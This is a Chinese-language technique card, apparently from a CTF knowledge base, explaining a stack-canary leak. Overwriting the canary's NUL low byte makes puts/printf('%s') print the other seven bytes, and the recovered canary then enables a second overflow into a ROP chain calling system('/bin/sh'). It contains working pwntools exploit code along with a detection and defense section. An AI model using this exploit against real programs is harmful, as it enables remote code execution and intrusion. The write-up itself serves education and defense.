---
id: binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak
title: Canary 低字节 NUL 覆盖泄露：溢出 1 字节让 puts/%s 带出剩余 7 字节，左移 8 位还原后二次溢出 ROP
type: scenario
domain: binary
path: binary/pwn/stack
technique: canary-low-byte-nul-overwrite-string-output-leak
aliases:
- canary 低字节覆盖
- canary NUL 泄露
- puts 泄露 canary
- canary 字节泄露
- ez2048 canary
- 金丝雀的诱惑
tags:
- pwn
- stack
- canary
- leak
- puts
- stack-overflow
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V177
  verified_at: '2026-11-06T17:22:27+08:00'
  notes: 已对照原文核对；exp 未在本机复跑
---

## 一句话结论

当栈溢出的写长度刚好能覆盖到 canary 的第一个字节，而程序在 canary 校验前又把同一个缓冲区当成 C 字符串输出（`puts(buf)`、`printf("%s", buf)` 等）时，把 canary 最低字节 `0x00` 改成任意非零字节（如 `'@'`）就能让字符串越过 NUL 终止符、继续打印 canary 的其余 7 字节；读回后 `u64(leak) << 8` 即可还原出完整 canary，再用它做第二次溢出覆盖返回地址，绕过栈保护执行 ROP。

## 原理

- **canary 的低字节为什么是 0**：x86-64 的栈保护值由 8 个随机字节组成，但最低字节固定为 `0x00`。这样 canary 作为字符串读取时会提前终止，防止 `puts`/`printf("%s")`/`strlen` 等把 canary 泄漏出去；函数返回前用 `fs:0x28` 与栈上的 8 字节比较，任一字节错误都会 `__stack_chk_fail`。
- **覆盖终止符**：典型布局为 `char buf[0x90]` 位于 `rbp-0x90`、canary 位于 `rbp-0x8`，`read(0, buf, 0x128)` 可写 0x98 字节。发送 `0x80` 字节填充 + 9 个 `'@'`：前 0x80 字节填满到 `rbp-0x10`，第 9 个 `'@'` 正好落在 `rbp-0x8`，把 canary 最低字节从 `0x00` 改成 `0x40`（`'@'`）。
- **字符串输出继续读**：随后 `puts(buf)` 从缓冲区开头扫描到 NUL；canary[0] 不再终止字符串，于是继续输出 canary[1..7]，直到某处出现 NUL（可能是 canary 内部、保存的 rbp 或更高栈数据）。攻击者收到的字节流是“填充 + 9 个 `'@'` + canary 剩余字节 + …”。
- **左移还原**：从输出中定位 `'@'*9` 之后读取 8 字节 `leak`。小端下 `leak[0]` 是 canary[1]、`leak[1]` 是 canary[2]……；执行 `canary = u64(leak) << 8` 后，canary[1..7] 被移到字节 1..7，最低字节补 0，恰好还原原始 canary（第 8 个读到的字节通常是 canary 后面的栈数据，被左移丢弃）。
- **概率**：canary[1..7] 中任意一个字节为 `0x00` 时，字符串会提前终止、读不到完整 7 字节；7 个随机字节都不为 0 的概率约为 `(255/256)^7 ≈ 97.3%`，失败时进程重开、新 canary 再试即可。
- **为什么能完成利用**：泄露只读取 canary，不修改返回地址；拿到完整 canary 后，第二次 `read` 用“填充 + 正确 canary + saved rbp + ROP 链”覆盖返回地址，主函数的 canary 校验通过，`ret` 进入 ROP。若程序还开了 PIE/ASLR，需要另行泄露代码/libc 基址（格式化字符串、栈上返回地址等）。
- **线程栈变体**：pthread 子线程有自己的栈和 TLS canary（仍为 `fs:0x28`，低字节 0x00），同样的“溢出 1 字节 + 名称/输入回显”可以泄露该线程的 canary；线程创建方式、缓冲区偏移和回显点需按题目调整。

## 触发条件

- 栈缓冲区溢出能够写到 `buf_end` 处的 canary 最低字节（至少 1 字节覆盖），且不会在输出前破坏其它关键数据。
- 程序在 canary 校验/函数返回前，把同一缓冲区按 C 字符串输出（`puts`、`printf("%s")`、`strlen` 后 `write`、日志打印等），而不是按固定长度输出。
- 程序存在第二次输入/溢出路径（同一函数循环、后续命令循环、再次读取），可用来提交带正确 canary 的 ROP 载荷。
- canary[1..7] 中没有 `0x00`（大多数情况成立，失败可重试）；程序无 fork 时每次重连会得到新 canary。
- 若有 PIE/ASLR，还需要代码/libc 地址泄露；若只有 canary，至少可以完成 ret2text/ret2plt 等固定地址利用。

## 利用步骤

1. 通过源码/反编译/调试确定缓冲区大小、canary 偏移、`read` 长度和字符串输出点；确认输出发生在 canary 校验之前。
2. 构造第一阶段载荷：`buf_size` 字节填充 + 1 个非零字节（如 `'@'`）覆盖 canary[0]；发送后让程序执行 `puts(buf)`/`printf("%s", buf)`。
3. 在输出中定位填充尾部/标记（例如 9 个 `'@'`），读取其后的 8 字节；小端解析后左移 8 位：`canary = u64(leak) << 8`。
4. 可选：再发一次同样的 1 字节覆盖验证 canary 稳定（同一进程内 canary 不变）；若输出长度不足 7 字节，说明 canary 中间有 NUL，重开进程重试。
5. 构造第二阶段载荷：`buf_size` 填充 + `p64(canary)` + 8 字节 saved rbp + ROP 链（`ret` 对齐、`pop rdi; ret`、`/bin/sh`、`system`；seccomp 环境改为 ORW）。
6. 触发第二次 `read`/函数返回，canary 校验通过，ROP 执行；若目标有 PIE/libc，先在同一阶段或前一阶段泄露基址。
7. 游戏/多阶段题目（如先达到分数门槛）先完成业务条件，再在同一命令循环里用上述两阶段泄露与溢出。

## PoC

最小两阶段（基于栈缓冲区 0x90、canary 在 `rbp-0x8`、`read(0x128)`、`puts(buf)` 的题目；未在本机复跑）：

```python
from pwn import *

# 第一阶段：覆盖 canary 最低字节，借 puts 带出 canary[1..7]
io.send(b'a' * 0x80 + b'@' * 9)
io.recvuntil(b'executing command: ')
io.recvuntil(b'@' * 9)
leak = io.recvn(8)                 # canary[1..7] + 后续栈字节
canary = u64(leak) << 8            # 低字节补 0，还原 8 字节 canary
log.success(f'canary = {canary:#x}')

# 第二阶段：带正确 canary 的 ROP
pop_rdi = 0x40133e
ret     = 0x40101a
binsh   = 0x404A40
system  = elf.sym['system']

payload  = b'a' * 0x88             # 填满 buf 到 canary 前
payload += p64(canary)             # 正确 canary
payload += b'deadbeef'             # saved rbp
payload += p64(ret)                # 栈对齐
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)
io.send(payload)
io.interactive()
```

线程栈变体（名称/输入回显泄露；回显起始位置不同，示例按“读到的 8 字节包含被改写的低字节”做 `-0x40` 修正，实际偏移需按题目回显调整）：

```python
io.recvuntil(b'Please enter your name >>')
io.send(b'a' * (0x150 - 8) + b'@')     # 覆盖线程栈 canary 低字节
io.recvuntil(b'a' * (0x150 - 8))
leak = u64(io.recvn(8))
canary = leak - 0x40                   # 把被写成 '@' 的低字节改回 0x00
# 若回显从 canary[1] 开始，则应改用 canary = leak << 8
```

## 变体与关联

- **线程栈变体**：pthread 子线程栈上的 canary 仍为 `fs:0x28`，通过 name/输入回显泄露；若漏洞是 TLS 覆盖而非字符串泄露，见 [[binary-pwn-stack-tls-stack-guard-overwrite-canary-rop]]。
- **暴力破解变体**：fork 服务 canary 不变但无法输出时，可逐字节爆破（`\x00` 结尾特性），见 [[binary-pwn-stack-fork-canary-bytewise-bruteforce]]。
- **格式化字符串变体**：若存在 `printf(buf)`，直接用 `%N$p` 读 canary 与 libc，见 [[binary-pwn-format-string-canary-libc-leak-rop-system]]；本卡适用于没有格式化字符串、只有字符串输出的场景。
- **输出函数变体**：`puts`、`printf("%s")`、`strlen`+`write`、日志/回显、`strdup` 等任何以 NUL 结尾的字符串处理都可泄露；若输出按固定长度（`write(1,buf,n)`）则 canary 不会越过终止符，需改用其它泄露。
- **关联**：[[binary-pwn-stack-ret2text-win-plus-one-align]]（canary 回填后的 ret2text）、[[binary-pwn-stack-pivot-leave-ret-bss]]（泄露后栈迁移）。

## 检测与防御

- **输出长度固定**：不要把可溢出的用户缓冲区交给 `puts`/`printf("%s")`/`strlen`；改用 `fwrite(buf, 1, n, stdout)` 或 `printf("%.*s", len, buf)`，显式限制长度。
- **读取长度校验**：`read` 的目标长度不能超过缓冲区；对用户输入做严格边界检查，避免覆盖 canary。
- **栈保护与加固**：启用 `-fstack-protector-strong`/`-fstack-protector-all`、PIE、ASLR、Full RELRO；canary 低字节终止符是设计特性，但不能替代长度校验。
- **检测特征**：程序读取长度大于缓冲区且随后打印同一缓冲区；输出中出现异常长的填充字符后紧跟 7 个随机字节；同一连接/进程内出现两次“先超长读、后带 canary 的 ROP”模式。
- **响应**：对疑似 canary 泄露的进程终止并重开（换 canary），审计该输入路径并修复长度检查。
